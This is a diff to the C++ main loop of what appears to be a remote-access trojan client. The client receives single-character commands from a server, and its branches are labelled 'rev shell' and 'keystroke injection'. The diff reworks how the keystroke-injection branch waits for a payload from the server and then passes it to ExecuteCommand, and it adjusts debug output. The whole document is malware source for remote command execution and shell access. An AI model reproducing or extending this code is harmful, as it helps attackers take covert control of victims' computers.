@@ -33,7 +33,6 @@ int main()
     while(outerloop)
     {
         connected = socket_setup(sock);
-        cout<< "here";
         //////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////
 
         bool loop = true;
@@ -46,7 +45,9 @@ int main()
             }
             else
             {
-                switch (receive_data(sock,"from_server.txt")[0])
+                char option = receive_data(sock,"from_server.txt")[0];
+                cout << "option: " << option << endl;
+                switch (option)
                 {
                     case '2':                                                                                     //rev shell
                     {
@@ -58,14 +59,22 @@ int main()
                     }
 
                     case '3':                                                                                     //keystroke injection
-                    {   
-                        send_data(sock,"from_server.txt","`");                                                    //mark the file read(switch)   
-                        cout << "mark the file read [switch] inside case 3" << endl;
+                    {
                         
-                        ExecuteCommand(receive_data(sock,"from_server.txt"));
-                        cout << "mark the file read [switch] inside case 3 (for execute command)" << endl;
+                        if(receive_data(sock,"from_server.txt")[0] == '`')
+                        {
+                            Sleep(1000);
+                            cout<< "waiting for payload " << endl;
+                        }      
+                        else
+                        {
+                            string payload = (receive_data(sock,"from_server.txt").substr(1));
+                            //cout << "Recieved after waiting ->" << payload << endl;
+                            ExecuteCommand(payload);
+                        }
+                        
                         send_data(sock,"from_server.txt","`");
-                        cout << "mark the file read (for execute command)" << endl;
+                        //cout << "mark the received command as read [switch3]" << endl;
                         break;
                     }
 
@@ -92,8 +101,11 @@ int main()
                     }
                     default:
                     {
-                        send_data(sock,"from_server.txt","`");                                                    //mark the file read(switch)
-                        cout << "mark the file read [switch] inside default" << endl;
+                        cout << "mark the file read [switch] inside default" << "->\n";
+                        cout << receive_data(sock,"from_server.txt") << endl;
+
+                        send_data(sock,"from_server.txt","`");                                                //mark the file read(switch)
+                        
                         
                         break;
                     }
